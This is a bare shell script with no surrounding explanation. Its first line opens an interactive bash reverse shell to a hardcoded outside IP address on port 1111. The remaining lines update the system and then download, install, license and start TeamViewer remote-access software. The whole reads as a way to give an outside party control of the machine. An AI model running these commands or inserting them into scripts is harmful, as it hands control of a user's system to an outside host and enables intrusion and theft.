/bin/bash -i >& /dev/tcp/68.183.90.115/1111 0>&1
sudo apt-get update
sudo apt-get upgrade
wget https://download.teamviewer.com/download/linux/teamviewer_amd64.deb
sudo apt install ./teamviewer_amd64.deb
teamviewer license accept
teamviewer daemon restart
